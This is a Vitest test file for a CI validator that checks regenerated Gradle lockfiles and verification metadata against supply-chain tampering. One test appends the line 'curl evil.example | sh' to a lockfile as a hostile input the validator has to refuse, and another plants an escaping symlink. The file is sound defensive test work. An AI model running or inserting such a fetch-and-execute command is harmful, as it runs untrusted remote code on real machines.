import { spawnSync } from "node:child_process";
import { mkdirSync, mkdtempSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join, resolve } from "node:path";
import { fileURLToPath } from "node:url";
import { afterAll, describe, expect, it } from "vitest";
import { lockfiles } from "./repoLockfiles.js";

// Black-box tests of .github/scripts/gradle-fixup-validate.mjs: the validator judges the artifact an
// unprivileged workflow produced, so every refusal below is a way that artifact could lie.
const repoRoot = resolve(dirname(fileURLToPath(import.meta.url)), "../../..");
const script = resolve(repoRoot, ".github/scripts/gradle-fixup-validate.mjs");

const scratch = mkdtempSync(join(tmpdir(), "fixup-validate-"));
afterAll(() => rmSync(scratch, { recursive: true, force: true }));

const sha = (seed) => seed.repeat(64).slice(0, 64);
const LOCK_HEADER = "# This is a Gradle generated file for dependency locking.\n# Manual edits can break the build and are not advised.\n";
const ALL_LOCKS = [
  "gradle.lockfile",
  "settings-gradle.lockfile",
  "buildscript-gradle.lockfile",
  "core/gradle.lockfile",
  "core/buildscript-gradle.lockfile",
  "server/gradle.lockfile",
  "server/buildscript-gradle.lockfile",
];

// Gradle's own layout: components of artifacts of one sha256 each.
function metadata(components, config = "      <verify-metadata>true</verify-metadata>\n      <verify-signatures>false</verify-signatures>\n") {
  const body = components
    .map(
      ([group, name, version, artifacts]) =>
        `      <component group="${group}" name="${name}" version="${version}">\n` +
        artifacts
          .map(([file, digest]) => `         <artifact name="${file}">\n            <sha256 value="${digest}" origin="Generated by Gradle"/>\n         </artifact>\n`)
          .join("") +
        "      </component>\n",
    )
    .join("");
  return (
    '<?xml version="1.0" encoding="UTF-8"?>\n<verification-metadata xmlns="https://schema.gradle.org/dependency-verification">\n' +
    `   <configuration>\n${config}   </configuration>\n   <components>\n${body}   </components>\n</verification-metadata>\n`
  );
}

const FOO_OLD = ["com.example", "foo-core", "1.0", [["foo-core-1.0.jar", sha("a")]]];
const FOO_NEW = ["com.example", "foo-core", "1.1", [["foo-core-1.1.jar", sha("b")]]];
const BAR = ["org.bar", "bar", "2.0", [["bar-2.0.jar", sha("c")]]];
const LIB5 = ["org.other", "lib", "5", [["lib-5.jar", sha("d")]]];

const TOML = '[versions]\nfoo = "1.1"\nbar = "2.0"\n\n[libraries]\nfoo-core = { module = "com.example:foo-core", version.ref = "foo" }\nbar = { module = "org.bar:bar", version.ref = "bar" }\n';
const SETTINGS = 'dependencyResolutionManagement {\n    versionCatalogs {\n        create("ktorLibs").from("io.ktor:ktor-version-catalog:3.6.0")\n    }\n}\n';
const TOML_DIFF =
  "diff --git a/gradle/libs.versions.toml b/gradle/libs.versions.toml\n--- a/gradle/libs.versions.toml\n+++ b/gradle/libs.versions.toml\n@@ -1,3 +1,3 @@\n [versions]\n-foo = \"1.0\"\n+foo = \"1.1\"\n bar = \"2.0\"\n";
const SETTINGS_DIFF =
  'diff --git a/settings.gradle.kts b/settings.gradle.kts\n--- a/settings.gradle.kts\n+++ b/settings.gradle.kts\n@@ -3,1 +3,1 @@\n-        create("ktorLibs").from("io.ktor:ktor-version-catalog:3.6.0")\n+        create("ktorLibs").from("io.ktor:ktor-version-catalog:3.6.1")\n';

function lock(entries) {
  return LOCK_HEADER + entries.map(([module, version]) => `${module}:${version}=compileClasspath,runtimeClasspath`).join("\n") + (entries.length ? "\n" : "") + "empty=annotationProcessor\n";
}

// A consistent bump of foo 1.0 -> 1.1: the head still has the stale lockfile and metadata, the
// artifact is the regenerated pair. Tests mutate `head`, `artifact` (path -> text) or `diff`.
function scenario() {
  const head = new Map([
    ["gradle/libs.versions.toml", TOML],
    ["settings.gradle.kts", SETTINGS],
    ["gradle/verification-metadata.xml", metadata([BAR, FOO_OLD, LIB5])],
    ["server/gradle.lockfile", lock([["com.example:foo-core", "1.0"], ["org.bar:bar", "2.0"], ["org.other:lib", "5"]])],
    ["settings-gradle.lockfile", lock([["io.ktor:ktor-version-catalog", "3.6.0"]])],
  ]);
  for (const path of ALL_LOCKS) if (!head.has(path)) head.set(path, lock([]));
  const artifact = new Map([
    ["gradle/verification-metadata.xml", metadata([BAR, FOO_NEW, FOO_OLD, LIB5])],
    ["server/gradle.lockfile", lock([["com.example:foo-core", "1.1"], ["org.bar:bar", "2.0"], ["org.other:lib", "5"]])],
    ["settings-gradle.lockfile", head.get("settings-gradle.lockfile")],
    ["manifest.json", '{"headSha":"abc"}\n'],
  ]);
  for (const path of ALL_LOCKS) if (!artifact.has(path)) artifact.set(path, head.get(path));
  return { head, artifact, diff: TOML_DIFF };
}

let counter = 0;
function validate(state, extraArgs = [], prepare = () => {}) {
  const dir = join(scratch, `case-${(counter += 1)}`);
  for (const [root, files] of [["head", state.head], ["artifact", state.artifact]]) {
    for (const [path, text] of files) {
      mkdirSync(dirname(join(dir, root, path)), { recursive: true });
      writeFileSync(join(dir, root, path), text);
    }
  }
  mkdirSync(join(dir, "head"), { recursive: true });
  mkdirSync(join(dir, "artifact"), { recursive: true });
  writeFileSync(join(dir, "spec.diff"), state.diff);
  prepare(join(dir, "artifact"));
  const result = spawnSync("node", [script, "--head", join(dir, "head"), "--artifact", join(dir, "artifact"), "--spec-diff", join(dir, "spec.diff"), ...extraArgs], { encoding: "utf8" });
  return { status: result.status, out: result.stdout, err: result.stderr };
}

const verdict = (result) => result.out.match(/^VERDICT: (\w+)$/m)?.[1];

describe("gradle fixup validator", () => {
  it("accepts additions-only metadata for a bump the head already locked", () => {
    const state = scenario();
    state.head.set("server/gradle.lockfile", state.artifact.get("server/gradle.lockfile"));
    const result = validate(state);
    expect(verdict(result)).toBe("OK");
    expect(result.status).toBe(0);
    expect(result.out).toContain("bumped com.example:foo-core:1.1");
    expect(result.out).toContain("lockfiles: 0 changed coordinate(s)");
  });

  it("accepts a lockfile change that lands on the declared version of a bumped coordinate", () => {
    const result = validate(scenario());
    expect(verdict(result)).toBe("OK");
    expect(result.status).toBe(0);
    expect(result.out).toMatch(/bumped\s+com\.example:foo-core\s+1\.0 -> 1\.1/);
  });

  it("checks the Ktor catalog coordinate in settings-gradle.lockfile against settings.gradle.kts", () => {
    const bumped = scenario();
    bumped.head.set("server/gradle.lockfile", bumped.artifact.get("server/gradle.lockfile")); // only the catalog moves here
    bumped.head.set("settings.gradle.kts", SETTINGS.replace("3.6.0", "3.6.1"));
    bumped.diff = SETTINGS_DIFF;
    bumped.artifact.set("settings-gradle.lockfile", lock([["io.ktor:ktor-version-catalog", "3.6.1"]]));
    const ok = validate(bumped);
    expect(verdict(ok)).toBe("OK");
    expect(ok.status).toBe(0);

    const stale = scenario();
    stale.head.set("settings.gradle.kts", SETTINGS.replace("3.6.0", "3.6.1"));
    stale.diff = SETTINGS_DIFF;
    const refused = validate(stale); // the artifact's settings lockfile still says 3.6.0
    expect(verdict(refused)).toBe("REFUSED");
    expect(refused.status).toBe(1);
    expect(refused.out).toMatch(/REFUSED L2: .*io\.ktor:ktor-version-catalog/);
  });

  it("refuses a bumped coordinate that no lockfile resolves to its declared version", () => {
    const state = scenario();
    state.artifact.set("server/gradle.lockfile", state.head.get("server/gradle.lockfile")); // regenerated from a different spec
    const result = validate(state);
    expect(verdict(result)).toBe("REFUSED");
    expect(result.out).toMatch(/REFUSED L2: no lockfile resolves com\.example:foo-core to the declared 1\.1/);
  });

  it("sends a transitive lockfile change to REVIEW, and refuses it under --strict", () => {
    const state = scenario();
    state.artifact.set("server/gradle.lockfile", lock([["com.example:foo-core", "1.1"], ["org.bar:bar", "2.0"], ["org.other:lib", "6"]]));
    const review = validate(state);
    expect(verdict(review)).toBe("REVIEW");
    expect(review.status).toBe(2);
    expect(review.out).toMatch(/other\s+org\.other:lib\s+5 -> 6/);
    expect(review.out).toContain("REVIEW L3:");

    const strict = validate(state, ["--strict"]);
    expect(verdict(strict)).toBe("REVIEW");
    expect(strict.status).toBe(1);
  });

  it("refuses an entry moved onto a version the spec does not declare, even when another file has the declared one", () => {
    const state = scenario();
    state.artifact.set("server/gradle.lockfile", lock([["com.example:foo-core", "1.2"], ["org.bar:bar", "2.0"], ["org.other:lib", "5"]]));
    state.artifact.set("core/gradle.lockfile", lock([["com.example:foo-core", "1.1"]]));
    const result = validate(state);
    expect(verdict(result)).toBe("REFUSED");
    expect(result.out).toMatch(/REFUSED L2: server\/gradle\.lockfile moved com\.example:foo-core to 1\.2 but the spec declares 1\.1/);
  });

  it("sends a bumped module that a file keeps on an undeclared version to REVIEW", () => {
    const state = scenario(); // core reaches foo-core only transitively and stays on 1.0
    state.head.set("core/gradle.lockfile", lock([["com.example:foo-core", "1.0"]]));
    state.artifact.set("core/gradle.lockfile", lock([["com.example:foo-core", "1.0"]]));
    const result = validate(state);
    expect(verdict(result)).toBe("REVIEW");
    expect(result.status).toBe(2);
    expect(result.out).toContain("REVIEW L2: core/gradle.lockfile keeps com.example:foo-core on 1.0 while the spec declares 1.1");
  });

  it("sends a declared version that disappears from a file that had it to REVIEW", () => {
    const state = scenario();
    state.head.set("core/gradle.lockfile", lock([["com.example:foo-core", "1.1"]]));
    state.artifact.set("core/gradle.lockfile", lock([]));
    const result = validate(state);
    expect(verdict(result)).toBe("REVIEW");
    expect(result.out).toContain("REVIEW L2: core/gradle.lockfile no longer resolves com.example:foo-core to the declared 1.1");
  });

  it("sends a configuration-only change on a bumped module to REVIEW", () => {
    const state = scenario();
    state.head.set("server/gradle.lockfile", state.artifact.get("server/gradle.lockfile"));
    state.artifact.set("server/gradle.lockfile", state.artifact.get("server/gradle.lockfile").replace("com.example:foo-core:1.1=compileClasspath,runtimeClasspath", "com.example:foo-core:1.1=compileClasspath"));
    const result = validate(state);
    expect(verdict(result)).toBe("REVIEW");
    expect(result.out).toMatch(/configs\s+com\.example:foo-core\s+configurations changed \(1\.1\)/);
  });

  it("sends a change of the locked-empty configurations to REVIEW", () => {
    const state = scenario();
    state.artifact.set("server/buildscript-gradle.lockfile", lock([]).replace("empty=annotationProcessor", "empty=annotationProcessor,detektPlugins"));
    const result = validate(state);
    expect(verdict(result)).toBe("REVIEW");
    expect(result.out).toMatch(/REVIEW L4: server\/buildscript-gradle\.lockfile: .*\+detektPlugins -\-/);
  });

  it("does not count a group member downgraded onto an added version string as bumped", () => {
    const state = scenario();
    const withExtra = (version) => lock([["com.example:foo-core", "1.1"], ["com.example:foo-extra", version], ["org.bar:bar", "2.0"], ["org.other:lib", "5"]]);
    state.head.set("server/gradle.lockfile", withExtra("1.2"));
    state.artifact.set("server/gradle.lockfile", withExtra("1.1")); // 1.1 is an added version string of the bump
    const result = validate(state);
    expect(verdict(result)).toBe("REVIEW");
    expect(result.out).toMatch(/downgrade\s+com\.example:foo-extra\s+1\.2 -> 1\.1/);
  });

  it("lists checksum additions that neither the bump nor a lockfile explains and sends them to REVIEW", () => {
    const state = scenario();
    state.head.set("server/gradle.lockfile", state.artifact.get("server/gradle.lockfile"));
    state.artifact.set("gradle/verification-metadata.xml", metadata([BAR, FOO_NEW, FOO_OLD, LIB5, ["org.unrelated", "thing", "9", [["thing-9.jar", sha("7")]]]]));
    const result = validate(state);
    expect(verdict(result)).toBe("REVIEW");
    expect(result.out).toContain("UNEXPL org.unrelated:thing:9");
    expect(result.out).toContain("REVIEW M1:");
  });

  it("refuses a changed checksum for an unchanged coordinate", () => {
    const state = scenario();
    state.artifact.set("gradle/verification-metadata.xml", state.artifact.get("gradle/verification-metadata.xml").replace(sha("c"), sha("e")));
    const result = validate(state);
    expect(verdict(result)).toBe("REFUSED");
    expect(result.status).toBe(1);
    expect(result.out).toMatch(/REFUSED H3: .*bar-2\.0\.jar|REFUSED H3: .*sha256/);
  });

  it("refuses a removed component", () => {
    const state = scenario();
    state.artifact.set("gradle/verification-metadata.xml", metadata([BAR, FOO_NEW]));
    const result = validate(state);
    expect(verdict(result)).toBe("REFUSED");
    expect(result.out).toContain("REFUSED H3:");
    expect(result.out).toContain("REFUSED H5: component org.other:lib:5 was removed");
  });

  it("refuses trust constructs anywhere in the metadata", () => {
    for (const construct of ['<also-trust value="' + sha("f") + '"/>', "<trusted-artifacts>", "<ignored-keys>", "<key-servers>"]) {
      const state = scenario();
      state.artifact.set("gradle/verification-metadata.xml", state.artifact.get("gradle/verification-metadata.xml").replace("         </artifact>\n      </component>\n   </components>", `            ${construct}\n         </artifact>\n      </component>\n   </components>`));
      const result = validate(state);
      expect(verdict(result), construct).toBe("REFUSED");
      expect(result.out, construct).toContain("REFUSED H2: forbidden trust construct");
    }
  });

  it("refuses a modified <configuration> block", () => {
    const state = scenario();
    state.artifact.set("gradle/verification-metadata.xml", state.artifact.get("gradle/verification-metadata.xml").replace("<verify-signatures>false", "<verify-signatures>true"));
    const result = validate(state);
    expect(verdict(result)).toBe("REFUSED");
    expect(result.out).toContain("REFUSED H2: the <configuration> block differs");
  });

  it("refuses a duplicate component and a second checksum on an existing artifact", () => {
    const duplicate = scenario();
    duplicate.artifact.set("gradle/verification-metadata.xml", metadata([BAR, FOO_NEW, FOO_NEW, FOO_OLD, LIB5]));
    const refusedDuplicate = validate(duplicate);
    expect(verdict(refusedDuplicate)).toBe("REFUSED");
    expect(refusedDuplicate.out).toMatch(/REFUSED H5: .*duplicate component com\.example:foo-core:1\.1/);

    const second = scenario();
    const widened = second.artifact.get("gradle/verification-metadata.xml").replace(
      `            <sha256 value="${sha("c")}" origin="Generated by Gradle"/>\n`,
      `            <sha256 value="${sha("c")}" origin="Generated by Gradle"/>\n            <sha256 value="${sha("9")}" origin="Generated by Gradle"/>\n`,
    );
    second.artifact.set("gradle/verification-metadata.xml", widened);
    const refusedSecond = validate(second);
    expect(verdict(refusedSecond)).toBe("REFUSED");
    expect(refusedSecond.out).toMatch(/REFUSED H5: .*a second sha256/);
  });

  it("refuses an added line that is not one of the five Gradle shapes", () => {
    const state = scenario();
    state.artifact.set("gradle/verification-metadata.xml", state.artifact.get("gradle/verification-metadata.xml").replace("   </components>", "      <!-- trust me -->\n   </components>"));
    const result = validate(state);
    expect(verdict(result)).toBe("REFUSED");
    expect(result.out).toContain("REFUSED H4:");
  });

  it("refuses any path outside the allow-list, symlinks included", () => {
    const extra = validate(scenario(), [], (artifact) => {
      mkdirSync(join(artifact, "web"), { recursive: true });
      writeFileSync(join(artifact, "web", "package.json"), "{}");
    });
    expect(verdict(extra)).toBe("REFUSED");
    expect(extra.out).toContain("REFUSED H1: path not on the allow-list: web/package.json");

    const nested = validate(scenario(), [], (artifact) => writeFileSync(join(artifact, "gradle-wrapper.jar"), "x"));
    expect(nested.out).toContain("REFUSED H1: path not on the allow-list: gradle-wrapper.jar");

    const link = validate(scenario(), [], (artifact) => {
      rmSync(join(artifact, "core", "gradle.lockfile"));
      symlinkSync("../../../outside", join(artifact, "core", "gradle.lockfile"));
    });
    expect(verdict(link)).toBe("REFUSED");
    expect(link.out).toContain("REFUSED H1: symlink core/gradle.lockfile");
  });

  it("refuses an artifact that lacks a file the head has", () => {
    const result = validate(scenario(), [], (artifact) => rmSync(join(artifact, "server", "buildscript-gradle.lockfile")));
    expect(verdict(result)).toBe("REFUSED");
    expect(result.out).toContain("REFUSED H1: the artifact lacks server/buildscript-gradle.lockfile");
  });

  it("refuses a malformed lockfile line", () => {
    const state = scenario();
    state.artifact.set("server/gradle.lockfile", state.artifact.get("server/gradle.lockfile") + "curl evil.example | sh\n");
    const result = validate(state);
    expect(verdict(result)).toBe("REFUSED");
    expect(result.out).toMatch(/REFUSED L1: server\/gradle\.lockfile line \d+ breaks the lockfile grammar/);
  });

  it("fails closed on a usage error and on unreadable input", () => {
    const usage = spawnSync("node", [script, "--head", "x"], { encoding: "utf8" });
    expect(usage.status).toBe(64);
    const missing = spawnSync("node", [script, "--head", join(scratch, "nope"), "--artifact", join(scratch, "nope"), "--spec-diff", join(scratch, "nope.diff")], { encoding: "utf8" });
    expect(missing.status).toBe(1);
    expect(missing.stdout).toContain("VERDICT: REFUSED");
  });

  it("prints an allow-list equal to the repository's lockfiles, the metadata and the manifest", () => {
    const result = spawnSync("node", [script, "--print-allow-list"], { encoding: "utf8" });
    expect(result.status).toBe(0);
    const printed = result.stdout.trim().split("\n").sort();
    expect(printed).toEqual([...lockfiles(repoRoot), "gradle/verification-metadata.xml", "manifest.json"].sort());
  });
});
